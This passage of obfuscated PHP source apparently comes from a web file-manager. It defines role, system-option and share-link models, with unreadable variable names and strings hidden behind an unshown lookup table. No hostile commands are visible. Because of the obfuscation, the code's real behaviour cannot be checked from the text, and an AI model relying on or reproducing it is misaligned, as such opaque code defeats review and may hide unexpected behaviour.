count($ãşò±°Ì[1]) > $Ñ’ˆ‹÷) { ignore_timeout(); return $íŒüÀŒ; } } return !1; } public function setMasterDB($›úŞ»†Å = true) { think_config($_SERVER[Ï×Œõ”û][483], $›úŞ»†Å); } } goto f¾Ÿ‹©ÖšÒ; bŒˆ½ª¡ö: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\164\x65\x6d\137\157\x70\x74\151\157\x6e"; protected $jsonField = array("\x6d\x65\156\165", "\x72\157\x6c\x65", "\162\157\x6c\145\x47\162\157\165\x70", "\x72\x65\147\151\163\164", "\x65\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($Ò‹’…¶“) { return "\x53\171\x73\x74\145\155\x4f\x70\x74\151\x6f\156\137{$Ò‹’…¶“}"; } protected function optionDefault($…Ì¡ª…• = '') { $ö½öûş =& $_SERVER[Ï×Œõ”û]; if ($…Ì¡ª…• == $ö½öûş[12]) { return $GLOBALS[$ö½öûş[6]][$ö½öûş[469]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\162\157\x6c\x65\x4c\x69\x73\x74"; public $field = array("\156\x61\155\145", "\x61\x75\164\150", "\154\x61\x62\145\154", "\144\151\163\x70\154\x61\x79", "\163\171\x73\x74\145\x6d", "\x64\145\163\143", "\x69\147\x6e\x6f\x72\x65\x45\170\x74", "\151\x67\x6e\x6f\x72\x65\106\151\x6c\145\x53\151\x7a\145", "\141\x64\x6d\151\156\x69\163\164\162\x61\164\x6f\x72", "\163\157\162\164"); public function listData($†Àç¬ë = false, $±Ë…š¡® = "\x73\157\x72\164", $ø–êâÊ¼ = false) { $Œº”Ô§„ =& $_SERVER[Ï×Œõ”û]; $¯Àµå = parent::listData($†Àç¬ë, $±Ë…š¡®, $ø–êâÊ¼); if (!$†Àç¬ë) { foreach ($¯Àµå as $§ÃºŠ‚µ => $¬¼Î§†±) { if ($¬¼Î§†±[$Œº”Ô§„[2330]] == 1) { $¯Àµå[$§ÃºŠ‚µ][$Œº”Ô§„[545]] = LNG($Œº”Ô§„[2620]); } } } return $¯Àµå; } public function update($ìˆ¬ïÏ£, $ö×š¥¸À) { $µ­ÈâÆÎ =& $_SERVER[Ï×Œõ”û]; $ø’â»ú = parent::listData($ìˆ¬ïÏ£); $òï±öé = $this->findByName($ö×š¥¸À[$µ­ÈâÆÎ[32]]); if (!$ø’â»ú || $òï±öé && $òï±öé[$µ­ÈâÆÎ[484]] != $ø’â»ú[$µ­ÈâÆÎ[484]]) { return !1; } if ($òï±öé[$µ­ÈâÆÎ[2330]] == 1) { $ö×š¥¸À = array($µ­ÈâÆÎ[32] => $ö×š¥¸À[$µ­ÈâÆÎ[32]], $µ­ÈâÆÎ[2158] => $ö×š¥¸À[$µ­ÈâÆÎ[2158]]); } $this->filterAuth($ö×š¥¸À[$µ­ÈâÆÎ[507]]); return parent::update($ìˆ¬ïÏ£, $ö×š¥¸À); } public function remove($‚‹×ºÈÜ) { $œ¤§æÏå = parent::listData($‚‹×ºÈÜ); if (!$œ¤§æÏå || $œ¤§æÏå[$_SERVER[Ï×Œõ”û][191]]) { return !1; } return parent::remove($‚‹×ºÈÜ); } public function add($Šò¢¨) { $ı‘ú·Ğå =& $_SERVER[Ï×Œõ”û]; $‹ö„¸µ— = $Šò¢¨[$ı‘ú·Ğå[32]]; if ($this->findByName($‹ö„¸µ—)) { return !1; } $ä‘Æ³¦¶ = array($ı‘ú·Ğå[514] => $‹ö„¸µ—, $ı‘ú·Ğå[2143] => $ı‘ú·Ğå[12], $ı‘ú·Ğå[2139] => $ı‘ú·Ğå[2147], $ı‘ú·Ğå[2621] => 1, $ı‘ú·Ğå[2142] => 0, $ı‘ú·Ğå[2622] => 0, $ı‘ú·Ğå[2141] => $this->getSort()); $Šò¢¨ = array_merge($ä‘Æ³¦¶, $Šò¢¨); $this->filterAuth($Šò¢¨[$ı‘ú·Ğå[507]]); return parent::insert($Šò¢¨); } private function getSort() { $ø–‡öªğ =& $_SERVER[Ï×Œõ”û]; $«”·õ¤¥ = parent::listData(); $®²Üˆªş = array_to_keyvalue($«”·õ¤¥, $ø–‡öªğ[12], $ø–‡öªğ[2159]); return empty($®²Üˆªş) ? 0 : max($®²Üˆªş) + 1; } private function filterAuth(&$ÎõÍŠ¨Ö) { $‘ø¿âÌ =& $_SERVER[Ï×Œõ”û]; $ÊÅ°—åÉ = array(); $‚ƒ¿…ú¶ = array_filter(explode($‘ø¿âÌ[50], $ÎõÍŠ¨Ö)); foreach ($‚ƒ¿…ú¶ as $ÎõÍŠ¨Ö) { $à ‹×ïË = explode($‘ø¿âÌ[10], $ÎõÍŠ¨Ö); if ($à ‹×ïË[0] == $‘ø¿âÌ[2623] && $à ‹×ïË[1] != $‘ø¿âÌ[1260]) { $ú…õªó‡ = $à ‹×ïË[0] . $‘ø¿âÌ[10] . $à ‹×ïË[1] . $‘ø¿âÌ[2624]; if (!in_array($ú…õªó‡, $‚ƒ¿…ú¶)) { $ÊÅ°—åÉ[] = $ú…õªó‡; } } $ÊÅ°—åÉ[] = $ÎõÍŠ¨Ö; } $ÎõÍŠ¨Ö = implode($‘ø¿âÌ[50], $ÊÅ°—åÉ); } public function findRoleDefault() { $å”Ä¨‰‚ =& $_SERVER[Ï×Œõ”û]; $ÑÚ ²€ = parent::listData(); $Öäİà = !1; foreach ($ÑÚ ²€ as $½òî¡‘€) { if (!$½òî¡‘€ || $½òî¡‘€[$å”Ä¨‰‚[2157]] == $å”Ä¨‰‚[230] || $½òî¡‘€[$å”Ä¨‰‚[2330]] == 1) { continue; } if (strstr($½òî¡‘€[$å”Ä¨‰‚[507]], $å”Ä¨‰‚[2625])) { continue; } if (!strstr($½òî¡‘€[$å”Ä¨‰‚[507]], $å”Ä¨‰‚[2626])) { continue; } if (!$Öäİà) { $Öäİà = $½òî¡‘€; continue; } $Ä´Ú°© = explode($å”Ä¨‰‚[50], $Öäİà[$å”Ä¨‰‚[507]]); $â¤ÄÚ­ = explode($å”Ä¨‰‚[50], $½òî¡‘€[$å”Ä¨‰‚[507]]); if (count($Ä´Ú°©) > count($â¤ÄÚ­)) { $Öäİà = $½òî¡‘€; } } return $Öäİà ? $Öäİà[$å”Ä¨‰‚[484]] : $å”Ä¨‰‚[12]; } public function sort($ƒ¤‚½ñ¿, $½¬ÕÂ¢) { return parent::update($ƒ¤‚½ñ¿, $½¬ÕÂ¢); } } goto B½µÆì…„; a´œ©·ö±¸: class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\145"; protected $dataAuto = array(array("\x6d\x6f\144\151\146\171\x54\151\x6d\x65", "\x74\151\155\145", "\151\156\163\x65\x72\164\54\165\x70\x64\x61\x74\145", "\146\x75\x6e\143\x74\x69\x6f\156"), array("\143\162\145\141\164\145\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\x73\x65\x72\164", "\146\x75\156\x63\x74\x69\x6f\156"), array("\157\160\164\x69\x6f\x6e\163", '', "\x69\156\x73\145\x72\164\x2c\165\160\144\x61\164\x65\54\163\145\154\x65\x63\164", "\152\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($×³ÙÚË¯) { $ÕŞÉï·Î =& $_SERVER[Ï×Œõ”û]; return array($ÕŞÉï·Î[2276] => array(USER_ID, $ÕŞÉï·Î[2277]), $ÕŞÉï·Î[2278] => array($×³ÙÚË¯[0], $ÕŞÉï·Î[2279])); } protected function ___listSimple() { $Ş„êÍ×ƒ = $this->field($this->fieldList)->where(array($_SERVER[Ï×Œõ”û][1547] => USER_ID))->select(); return $Ş„êÍ×ƒ ? $Ş„êÍ×ƒ : array(); } protected function ___getInfoShare($çİ€ˆÛ•) { return $this->_getShareInfo(array($_SERVER[Ï×Œõ”û][693] => $çİ€ˆÛ•), !1); } protected function getInfo($¦û¦ˆ‚ı) { $Ä÷åŸâè = $this->getInfoShare($¦û¦ˆ‚ı); return $this->shareSourceInfo($Ä÷åŸâè); } public function getInfoByHash($²ªÄ»…×) { return $this->_getShareInfo(array($_SERVER[Ï×Œõ”û][1509] => $²ªÄ»…×)); } public function getInfoByPath($šîÜÊ¶Ó) { $Œ¨Š ÒÆ =& $_SERVER[Ï×Œõ”û]; $ô·ó€øÏ = array($Œ¨Š ÒÆ[1547] => USER_ID, $Œ¨Š ÒÆ[193] => $šîÜÊ¶Ó); return $this->_getShareInfo($ô·ó€øÏ); } public function getInfoBySourcePath($ñØı‹÷Ç) { $¢Ó†¢•‰ =& $_SERVER[Ï×Œõ”û]; $è›³ú•Ö = array($¢Ó†¢•‰[1547] => USER_ID, $¢Ó†¢•‰[588] => $ñØı‹÷Ç); return $this->_getShareInfo($è›³ú•Ö); } private function _getShareInfo($£ÎÌ™è, $êŸ´½¯ = true) { $Ô·ñ´Í§ =& $_SERVER[Ï×Œõ”û]; $›’á·¿Å = $this->where($£ÎÌ™è)->find(); if (!$›’á·¿Å) { return !1; } if (!is_array($›’á·¿Å[$Ô·ñ´Í§[585]])) { $›’á·¿Å[$Ô·ñ´Í§[585]] = array(); } $£ÎÌ™è = array($Ô·ñ´Í§[693] => $›’á·¿Å[$Ô·ñ´Í§[693]]); $ãÂÉÔ·‡ = $Ô·ñ´Í§[2280]; $›’á·¿Å[$Ô·ñ´Í§[1505]] = Model($Ô·ñ´Í§[694])->order($Ô·ñ´Í§[484])->field($ãÂÉÔ·‡)->where($£ÎÌ™è)->select(); if (!$êŸ´½¯) { return $›’á·¿Å; } return $this->shareSourceInfo($›’á·¿Å); } private function shareSourceInfo($’î²™æ ) { $¬„×¡ =& $_SERVER[Ï×Œõ”û]; if (!is_array($’î²™æ )) { return $’î²™æ ; } if ($’î²™æ [$¬„×¡[193]] == $¬„×¡[230]) { $’î²™æ [$¬„×¡[90]] = IO::info($’î²™æ [$¬„×¡[588]]); } else { $’î²™æ [$¬„×¡[90]] = Model($¬„×¡[1487])->pathInfo($’î²™æ [$¬„×¡[193]]); } return $’î²™æ ; } protected function getInfoAuth($Ğ‡¡¬ë¶) { $•ˆîƒ×ì =& $_SERVER[Ï×Œõ”û]; $´¥¨†òô = $this->getInfo($Ğ‡¡¬ë¶); if ($´¥¨†òô[$•ˆîƒ×ì[1547]] == USER_ID) { $´¥¨†òô[$•ˆîƒ×ì[507]] = $´¥¨†òô[$•ˆîƒ×ì[90]][$•ˆîƒ×ì[507]]; } else { $´¥¨†òô[$•ˆîƒ×ì[507]] = Model($•ˆîƒ×ì[592])->authMake($´¥¨†òô[$•ˆîƒ×ì[1505]]); } return $´¥¨†òô; } protected function listData($¯Ó²‘¨› = null, $¥‚íÁÍµ = 300) { $şÕëáè =& $_SERVER[Ï×Œõ”û]; $ŞÅûà§ = array(array($şÕëáè[583] => array($şÕëáè[1133], 0), $şÕëáè[691] => array($şÕëáè[1133], 0), $şÕëáè[2281] => $şÕëáè[2237])); if ($¯Ó²‘¨› == $şÕëáè[2282]) { $ŞÅûà§ = array($şÕëáè[583] => 1); } else { if ($¯Ó²‘¨› == $şÕëáè[1298]) { $ŞÅûà§ = array($şÕëáè[691] => 1); } } $ŞÅûà§[$şÕëáè[1547]] = USER_ID; $é‚ˆ«Äƒ = $this->where($ŞÅûà§)->selectPage($¥‚íÁÍµ); return $é‚ˆ«Äƒ; } protected function listToMe($Šµ¡£ß = 300) { $Ã€î¾ÃÕ =& $_SERVER[Ï×Œõ”û]; $Îú‘áñç = Model($Ã€î¾ÃÕ[2283])->userGroupParents(USER_ID); $êóªìá = array($Ã€î¾ÃÕ[676] => SourceModel::TYPE_USER, $Ã€î¾ÃÕ[594] => USER_ID); if ($Îú‘áñç) { $êóªìá = array(array($Ã€î¾ÃÕ[676] => SourceModel::TYPE_USER, $Ã€î¾ÃÕ[594] => USER_ID), array($Ã€î¾ÃÕ[676] => SourceModel::TYPE_GROUP, $Ã€î¾ÃÕ[594] => array($Ã€î¾ÃÕ[7], $Îú‘áñç)), $Ã€î¾ÃÕ[2281] => $Ã€î¾ÃÕ[2237]); } $¤‰™»…Æ = Model($Ã€î¾ÃÕ[694])->where($êóªìá)->selectPage($Šµ¡£ß); $ÎéØç•Ó = array_to_keyvalue_group($¤‰™»…Æ[$Ã€î¾ÃÕ[447]], $Ã€î¾ÃÕ[693]); if (!$ÎéØç•Ó) { return $¤‰™»…Æ; } $ìüá¸œ = $Ã€î¾ÃÕ[2284]; $êóªìá = array($Ã€î¾ÃÕ[693] => array($Ã€î¾ÃÕ[512], array_keys($ÎéØç•Ó))); $‹ÉóÂÈÍ = $this->field($ìüá¸œ)->where($êóªìá)->select(); foreach ($‹ÉóÂÈÍ as $ó×ïÉÈñ => &$¢š¨·û) { $¢š¨·û[$Ã€î¾ÃÕ[1505]] = $ÎéØç•Ó[$¢š¨·û[$Ã€î¾ÃÕ[693]]]; } unset($¢š¨·û); $˜§ˆçÈ = array($Ã€î¾ÃÕ[2285] => $‹ÉóÂÈÍ, $Ã€î¾ÃÕ[2286] => $¤‰™»…Æ[$Ã€î¾ÃÕ[444]]); return $˜§ˆçÈ; } protected function shareAdd($³ú½õ©ë, $Â‚ØŠò¡) { $‚«¨„ù‡ =& $_SERVER[Ï×Œõ”û]; $¬ÙÔ¥ÜŠ = $this->_addShareData($³ú½õ©ë, $Â‚ØŠò¡); if (!empty($Â‚ØŠò¡[$‚«¨„ù‡[2287]])) { $this->_shareAuthSet($¬ÙÔ¥ÜŠ, $Â‚ØŠò¡[$‚«¨„ù‡[2287]]); } $this->shareEventAdd($³ú½õ©ë, $Â‚ØŠò¡, $‚«¨„ù‡[2288]); return $¬ÙÔ¥ÜŠ; } protected function shareAddSystem($–«Ù×Íë, $Ë¿¨ÕÏ) { $å˜Ä‹ø› =& $_SERVER[Ï×Œõ”û]; $¹é‹é…¸ = $this->_addShareData($–«Ù×Íë, $Ë¿¨ÕÏ, $å˜Ä‹ø›[191]); $this->_shareAuthSet($¹é‹é…¸, $Ë¿¨ÕÏ[$å˜Ä‹ø›[2287]]); return $¹é‹é…¸; } private function shareEventAdd($ıùŒ×é–, $ğßÙè¾, $œæ§ä¡Ò = "\141\x64\144") { $¯©¬×–Ù =& $_SERVER[Ï×Œõ”û]; if (!$ıùŒ×é– || $ıùŒ×é– == $¯©¬×–Ù[230]) { return; } if ($œæ§ä¡Ò == $¯©¬×–Ù[2288]) { if ($ğßÙè¾[$¯©¬×–Ù[583]] == $¯©¬×–Ù[91]) { Model($¯©¬×–Ù[661])->eventShare($ıùŒ×é–, $¯©¬×–Ù[2289]); } if ($ğßÙè¾[$¯©¬×–Ù[691]] == $¯©¬×–Ù[91]) { Model($¯©¬×–Ù[661])->eventShare($ıùŒ×é–, $¯©¬×–Ù[2290]); } return; } $¥ìº’˜µ = $this->getInfoByPath($ıùŒ×é–); $âÄÉ¤ô® = $¯©¬×–Ù[2291]; if ($¥ìº’˜µ[$¯©¬×–Ù[583]] == $¯©¬×–Ù[230] && $ğßÙè¾[$¯©¬×–Ù[583]] == $¯©¬×–Ù[91]) { $âÄÉ¤ô® = $¯©¬×–Ù[2289]; } if ($¥ìº’˜µ[$¯©¬×–Ù[583]] == $¯©¬×–Ù[91] && $ğßÙè¾[$¯©¬×–Ù[583]] == $¯©¬×–Ù[230]) { $âÄÉ¤ô® = $¯©¬×–Ù[2292]; } if ($¥ìº’˜µ[$¯©¬×–Ù[691]] == $¯©¬×–Ù[230] && $ğßÙè¾[$¯©¬×–Ù[691]] == $¯©¬×–Ù[91]) { $âÄÉ¤ô® = $¯©¬×–Ù[2290]; } if ($¥ìº’˜µ[$¯©¬×–Ù[691]] == $¯©¬×–Ù[91] && $ğßÙè¾[$¯©¬×–Ù[691]] == $¯©¬×–Ù[230]) { $âÄÉ¤ô® = $¯©¬×–Ù[2293]; } Model($¯©¬×–Ù[661])->eventShare($ıùŒ×é–, $âÄÉ¤ô®); return; } private function _addShareData($ï’ˆäÚ, $È“ùùµ÷ = array(), $ƒÂ„¢÷“ = false) { $Şå×ƒ =& $_SERVER[Ï×Œõ”û]; $™¨½‹Š× = $ƒÂ„¢÷“ == $Şå×ƒ[191] ? 0 : USER_ID; $ô™ú©Í£ = array($Şå×ƒ[511] => $ï’ˆäÚ, $Şå×ƒ[1921] => $™¨½‹Š×); if ($ï’ˆäÚ == 0) { $ô™ú©Í£ = array($Şå×ƒ[2294] => $È“ùùµ÷[$Şå×ƒ[588]], $Şå×ƒ[1921] => $™¨½‹Š×); } if ($ı¢è‰´¹ = $this->where($ô™ú©Í£)->find()) { return $ı¢è‰´¹[$Şå×ƒ[693]]; } if ($ï’ˆäÚ == 0) { $ä·ù•ã = array($Şå×ƒ[32] => get_path_this($È“ùùµ÷[$Şå×ƒ[87]])); } else { $ä·ù•ã = Model($Şå×ƒ[939])->sourceInfo($ï’ˆäÚ); if (!$ä·ù•ã) { return !1; } } if (!$È“ùùµ÷[$Şå×ƒ[1818]]) { $È“ùùµ÷[$Şå×ƒ[1818]] = $ä·ù•ã[$Şå×ƒ[32]]; } $ÀæÂô = array($Şå×ƒ[1921] => $™¨½‹Š×, $Şå×ƒ[511] => $ï’ˆäÚ, $Şå×ƒ[1818] => $Şå×ƒ[12], $Şå×ƒ[583] => 0, $Şå×ƒ[691] => 0, $Şå×ƒ[588] => $Şå×ƒ[12], $Şå×ƒ[384] => $Şå×ƒ[12], $Şå×ƒ[1007] => $Şå×ƒ[12], $Şå×ƒ[2295] => 0, $Şå×ƒ[2296] => 0, $Şå×ƒ[868] => 0, $Şå×ƒ[585] => $Şå×ƒ[12], $Şå×ƒ[1509] => $Şå×ƒ[12]); $ĞˆÆÚ×Ğ = explode($Şå×ƒ[50], $Şå×ƒ[2297]); foreach ($ĞˆÆÚ×Ğ as $Û‚ÏØı¤) { if (!isset($È“ùùµ÷[$Û‚ÏØı¤])) { continue; } $ÀæÂô[$Û‚ÏØı¤] = $È“ùùµ÷[$Û‚ÏØı¤]; } $´¾Õİµ¤ = $this->add($ÀæÂô); $À¦Ş„Ê‡ = array($Şå×ƒ[1509] => short_id($´¾Õİµ¤)); if ($this->where($À¦Ş„Ê‡)->find()) { $À¦Ş„Ê‡[$Şå×ƒ[1509]] .= $Şå×ƒ[474] . rand_string(2, 3); } $this->where(array($Şå×ƒ[2298] => $´¾Õİµ¤))->save($À¦Ş„Ê‡); return $´¾Õİµ¤; } private function _shareAuthSet($å­İÈ»Ş, $Ï‹íÈà•) { $ÂóŸ½”ü =& $_SERVER[Ï×Œõ”û]; if (!is_array($Ï‹íÈà•)) { return !1; } $„¹ÉÙ™ = Model($ÂóŸ½”ü[2246]); $„¹ÉÙ™->where(array($ÂóŸ½”ü[693] => $å­İÈ»Ş))->delete(); $€¥¼‹ù‚ = array(); foreach ($Ï‹íÈà• as $İşí·‡À) { $ÏÂ†Ôğ¤ = SourceModel::TYPE_USER; if ($İşí·‡À[$ÂóŸ½”ü[190]] == SourceModel::TYPE_GROUP) { $ÏÂ†Ôğ¤ = SourceModel::TYPE_GROUP; } $Ø‘ë›„Å = array($ÂóŸ½”ü[693] => $å­İÈ»Ş, $ÂóŸ½”ü[190] => $ÏÂ†Ôğ¤, $ÂóŸ½”ü[594] => intval($İşí·‡À[$ÂóŸ½”ü[594]]), $ÂóŸ½”ü[1594] => 0, $ÂóŸ½”ü[2299] => -1); if ($İşí·‡À[$ÂóŸ½”ü[1594]]) { $Ø‘ë›„Å[$ÂóŸ½”ü[1594]] = $İşí·‡À[$ÂóŸ½”ü[1594]]; } else { if ($İşí·‡À[$ÂóŸ½”ü[2299]]) { $Ø‘ë›„Å[$ÂóŸ½”ü[2299]] = $İşí·‡À[$ÂóŸ½”ü[2299]]; } } $€¥¼‹ù‚[] = $Ø‘ë›„Å; } return $„¹ÉÙ™->addAll($€¥¼‹ù‚, array(), !0); } public function numViewAdd($‹Â€ƒôé) { $şÔåñĞ =& $_SERVER[Ï×Œõ”û]; $Ê–­ø­´ = array($şÔåñĞ[2298] => $‹Â€ƒôé); $this->where($Ê–­ø­´)->setAdd($şÔåñĞ[2295]); } public function numDownloadAdd($¥ïĞ£·²) { $àÜşèÊë =& $_SERVER[Ï×Œõ”û]; $ÀÅ¶Æé = array($àÜşèÊë[2298] => $¥ïĞ£·²); $this->where($ÀÅ¶Æé)->setAdd($àÜşèÊë[2296]); } protected function shareEdit($äŒŸ´–, $İÄÌ¢ıœ) { $üĞÃôş =& $_SERVER[Ï×Œõ”û]; $÷óèÑ‡¢ = $this->getInfo($äŒŸ´–); if (!$÷óèÑ‡¢) { return !1; } if ($İÄÌ¢ıœ[$üĞÃôş[1509]] && $İÄÌ¢ıœ[$üĞÃôş[583]] == $üĞÃôş[91]) { if ($İÄÌ¢ıœ[$üĞÃôş[1509]] == $÷óèÑ‡¢[$üĞÃôş[1509]]) { unset($İÄÌ¢ıœ[$üĞÃôş[1509]]); } if ($İÄÌ¢ıœ[$üĞÃôş[1509]]) { $ïâÙ²ıÑ = $this->where(array($üĞÃôş[2300] => $İÄÌ¢ıœ[$üĞÃôş[1509]]))->find(); if ($ïâÙ²ıÑ) { return !1; } if (!is_array($İÄÌ¢ıœ[$üĞÃôş[585]])) { $İÄÌ¢ıœ[$üĞÃôş[585]] = is_array($÷óèÑ‡¢[$üĞÃôş[585]]) ? $÷óèÑ‡¢[$üĞÃôş[585]] : array(); } if (!$İÄÌ¢ıœ[$üĞÃôş[585]][$üĞÃôş[2301]]) { $İÄÌ¢ıœ[$üĞÃôş[585]][$üĞÃôş[2301]] = $÷óèÑ‡¢[$üĞÃôş[1509]]; $İÄÌ¢ıœ[$üĞÃôş[585]][$üĞÃôş[2302]] = $üĞÃôş[91]; } } } $this->_checkLinkShare($İÄÌ¢ıœ, $÷óèÑ‡¢); $Å´ğ²¨ = array(); $ü³½×  = explode($üĞÃôş[50], $üĞÃôş[2303]); foreach ($ü³½×  as $î»óüä½) { if (!array_key_exists($î»óüä½, $İÄÌ¢ıœ)) { continue; } $Å´ğ²¨[$î»óüä½] = $İÄÌ¢ıœ[$î»óüä½]; } $this->shareEventAdd($÷óèÑ‡¢[$üĞÃôş[193]], $İÄÌ¢ıœ, $üĞÃôş[1516]); $this->where(array($üĞÃôş[2298] => $äŒŸ´–))->save($Å´ğ²¨); if (isset($İÄÌ¢ıœ[$üĞÃôş[2287]])) { $this->_shareAuthSet($äŒŸ´–, $İÄÌ¢ıœ[$üĞÃôş[2287]]); } return !0; } private function _checkLinkShare($‘Ú¦•, $óôÏÕ) { $¹×–óü =& $_SERVER[Ï×Œõ”û]; if ($‘Ú¦•[$¹×–óü[583]] != $¹×–óü[91]) { return; } $ÜŞßšá = $óôÏÕ[$¹×–óü[90]][$¹×–óü[193]]; if ($óôÏÕ[$¹×–óü[90]][$¹×–óü[33]] != $¹×–óü[232]) { $í¥ÛúòÅ = $this->_folderReport($ÜŞßšá); if (!$í¥ÛúòÅ) { return; } show_json(LNG($¹×–óü[2304]) . $¹×–óü[2305] . $í¥ÛúòÅ, !1); } $¨×úõš = Model($¹×–óü[939])->fileInfoGet($óôÏÕ[$¹×–óü[90]][$¹×–óü[193]]); if (!$¨×úõš) { return; } $ØöŠÌ˜¡ = $this->shareFileMeta($¨×úõš[$¹×–óü[562]]); if (isset($ØöŠÌ˜¡[$¹×–óü[452]]) && $ØöŠÌ˜¡[$¹×–óü[452]] == $¹×–óü[91]) { show_json(LNG($¹×–óü[2306]), !1); } } private function _folderReport($œØ§ƒÉŞ) { $ºõ£ª²Ã =& $_SERVER[Ï×Œõ”û]; $‹ú­Ú°¶ = array($ºõ£ª²Ã[562] => array($ºõ£ª²Ã[1133], 0), $ºõ£ª²Ã[856] => 3); $¥Ñ®‹ƒ = Model($ºõ£ª²Ã[2307])->where($‹ú­Ú°¶)->field($ºõ£ª²Ã[562])->select(); if (!$¥Ñ®‹ƒ) { return !1; } $¥Ñ®‹ƒ = array_to_keyvalue($¥Ñ®‹ƒ, $ºõ£ª²Ã[12], $ºõ£ª²Ã[562]); $Õ„Ââç = $ºõ£ª²Ã[50] . $œØ§ƒÉŞ . $ºõ£ª²Ã[50]; $‹ú­Ú°¶ = array($ºõ£ª²Ã[562] => array($ºõ£ª²Ã[7], $¥Ñ®‹ƒ), $ºõ£ª²Ã[609] => array($ºõ£ª²Ã[471], "\x25{$Õ„Ââç}\45"), $ºõ£ª²Ã[525] => 0); $å‹‹¥¢ = Model($ºõ£ª²Ã[939])->where($‹ú­Ú°¶)->field($ºõ£ª²Ã[2308])->find(); if (!$å‹‹¥¢) { return !1; } $Ó‚ØäîÒ = substr($å‹‹¥¢[$ºõ£ª²Ã[609]], strpos($å‹‹¥¢[$ºõ£ª²Ã[609]], $Õ„Ââç)); $‹ú­Ú°¶ = array($ºõ£ª²Ã[193] => array($ºõ£ª²Ã[7], trim($Ó‚ØäîÒ, $ºõ£ª²Ã[50]))); $î•”Üª– = Model($ºõ£ª²Ã[939])->where($‹ú­Ú°¶)->field($ºõ£ª²Ã[32])->select(); $î€Ú“ØÈ = array_to_keyvalue($î•”Üª–, $ºõ£ª²Ã[12], $ºõ£ª²Ã[32]); $î€Ú“ØÈ[] = $å‹‹¥¢[$ºõ£ª²Ã[32]]; return implode($ºõ£ª²Ã[8], $î€Ú“ØÈ); } protected function remove($…ÏÄ³ç) { $ùíæºÜÄ =& $_SERVER[Ï×Œõ”û]; $âäœ¿˜ó = is_array($…ÏÄ³ç) ? $…ÏÄ³ç : array($…ÏÄ³ç); for ($”º´™¦ = 0; $”º´™¦ < count($âäœ¿˜ó); $”º´™¦++) { $äëÊÜâË = $this->getInfo($âäœ¿˜ó[$”º´™¦]); if ($äëÊÜâË[$ùíæºÜÄ[691]] == $ùíæºÜÄ[91]) { Model($ùíæºÜÄ[661])->eventShare($äëÊÜâË[$ùíæºÜÄ[193]], $ùíæºÜÄ[2293]); } if ($äëÊÜâË[$ùíæºÜÄ[583]] == $ùíæºÜÄ[91]) { Model($ùíæºÜÄ[661])->eventShare($äëÊÜâË[$ùíæºÜÄ[193]], $ùíæºÜÄ[2292]); } } $‘Ûğóª“ = array($ùíæºÜÄ[693] => array($ùíæºÜÄ[7], $âäœ¿˜ó)); $ŒŠ†¶Ÿ‰ = $this->where($‘Ûğóª“)->delete(); if ($ŒŠ†¶Ÿ‰) { Model($ùíæºÜÄ[694])->where($‘Ûğóª“)->delete(); } return $ŒŠ†¶Ÿ‰; } protected function removeBySource($µü÷šÂ¸) { $õûÜ¸Ôİ =& $_SERVER[Ï×Œõ”û]; $´µçôœ× = array($õûÜ¸Ôİ[511] => array($õûÜ¸Ôİ[512], $µü÷šÂ¸)); $ÓøÉò—ª = $this->field($õûÜ¸Ôİ[693])->where($´µçôœ×)->select(); $Ú—ğ”Ğ˜ = array_to_keyvalue($ÓøÉò—ª, $õûÜ¸Ôİ[12], $õûÜ¸Ôİ[693]); if (!$Ú—ğ”Ğ˜) { return; } foreach ($ÓøÉò—ª as $ı—¡–ÆÎ) { $this->shareInfoMofify($ı—¡–ÆÎ, $õûÜ¸Ôİ[2309]); } $´µçôœ× = array($õûÜ¸Ôİ[2298] => array($õûÜ¸Ôİ[512], $Ú—ğ”Ğ˜)); $this->where($´µçôœ×)->delete(); Model($õûÜ¸Ôİ[694])->where($´µçôœ×)->delete(); } public function listAll($Àš­ŞŒà) { $êÕù†„ =& $_SERVER[Ï×Œõ”û]; $Ó—à‚©¬ = array(); if ($Àš­ŞŒà[$êÕù†„[1547]]) { $Ó—à‚©¬[$êÕù†„[1547]] = $Àš­ŞŒà[$êÕù†„[1547]]; } if ($Àš­ŞŒà[$êÕù†„[867]]) { $¼œéµ“ = $Àš­ŞŒà[$êÕù†„[868]] ? $Àš­ŞŒà[$êÕù†„[868]] : strtotime(date($êÕù†„[2310])); $Ó—à‚©¬[$êÕù†„[233]] = array($êÕù†„[410], array($Àš­ŞŒà[$êÕù†„[867]], $¼œéµ“)); } if ($Àš­ŞŒà[$êÕù†„[33]]) { $Ó—à‚©¬[$Àš­ŞŒà[$êÕù†„[33]]] = 1; } else { $Ó—à‚©¬[] = array($êÕù†„[583] => array($êÕù†„[1133], 0), $êÕù†„[691] => array($êÕù†„[1133], 0), $êÕù†„[2281] => $êÕù†„[2237]); } if ($Àš­ŞŒà[$êÕù†„[2233]]) { $Ó—à‚©¬[] = array($êÕù†„[1509] => $Àš­ŞŒà[$êÕù†„[2233]], $êÕù†„[1818] => array($êÕù†„[471], "\x25{$Àš­ŞŒà[$êÕù†„[2233]]}\x25"), $êÕù†„[2281] => $êÕù†„[2237]); } $²§ú‰¥ = $this->_makeOrder()->where($Ó—à‚©¬)->selectPage(20); if (empty($²§ú‰¥[$êÕù†„[447]])) { return array(); } $this->_listDataApply($²§ú‰¥[$êÕù†„[447]]); return $²§ú‰¥; } public function listDataApply($­•Õï) { $this->_listDataApply($­•Õï); return $­•Õï; } private function _listDataApply(&$ŒêäğÏ) { $¤šøËî³ =& $_SERVER[Ï×Œõ”û]; $ËÊıÏ°í = array_to_keyvalue($ŒêäğÏ, $¤šøËî³[12], $¤šøËî³[1547]); $Í·Æ«¹ = Model($¤šøËî³[622])->userListInfo(array_unique($ËÊıÏ°í)); $àá¡Ş±Ñ = array_to_keyvalue($ŒêäğÏ, $¤šøËî³[12], $¤šøËî³[193]); $ßŸßÕ„Ò = Model($¤šøËî³[939])->sourceListInfo($àá¡Ş±Ñ, !0); foreach ($ŒêäğÏ as $ú–”Ğúâ => &$¸¦êé“í) { $å…Ùƒí = $¸¦êé“í[$¤šøËî³[1547]]; $¸¦êé“í[$¤šøËî³[2311]] = $Í·Æ«¹[$å…Ùƒí] ? $Í·Æ«¹[$å…Ùƒí] : !1; if (!$¸¦êé“í[$¤šøËî³[2311]] || 